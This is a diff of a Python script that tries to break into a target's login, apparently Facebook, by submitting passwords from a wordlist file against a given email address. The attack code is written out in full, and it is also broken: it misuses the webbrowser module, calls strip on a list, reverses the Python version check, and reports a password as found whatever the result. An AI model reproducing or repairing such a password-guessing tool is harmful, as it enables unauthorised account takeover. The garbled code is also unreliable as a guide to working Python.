@@ -3,6 +3,7 @@ import requests
 from ast import Break, Try
 import webbrowser
 import time
+
 if sys.version_info[0] !=2: 
 	print('''--------------------------------------
 	REQUIRED PYTHON 3
@@ -23,23 +24,19 @@ file=open('passwords.txt','r')
 
 email = input("input Email of target:")
 print ("\nTarget Email ID : ",email+"")
-print ("\nTrying Passwords from list")
-i=0
-while file:
-	password=file.readline().strip()
-	i+=1
-	if len(password) < 11:
-		continue
-	print("Trying"+password)
-	response = webbrowser.open(post_url)
-    
-	if responses: code = 200
-	webbrowser.select_form(nr=0)()
-	webbrowser.select['email']=email
-	webbrowser.select['password']=password
-	requests=webbrowser.submit()
-	responses_data=response.read()
-	'find friends' in responses_data or 'two factor authentication' in responses_data or 'security code' in  responses_data;
-	print("password of the target is: ",password)
+content = file.readlines()
+passboy = content.strip("\n")
+print("[*]Fixating pass%s"%content)
 
-	break
+response = webbrowser.open(post_url)
+    
+if responses: code = 200
+webbrowser.select_form(nr=0)()
+webbrowser.select['email']=email
+webbrowser.select['password']= passboy
+requests=webbrowser.submit()
+responses_data=response.read()
+'find friends' in responses_data or 'two factor authentication' in responses_data or 'security code' in  responses_data;
+print("[*]Found:%s"%content)
+
+sys.exit
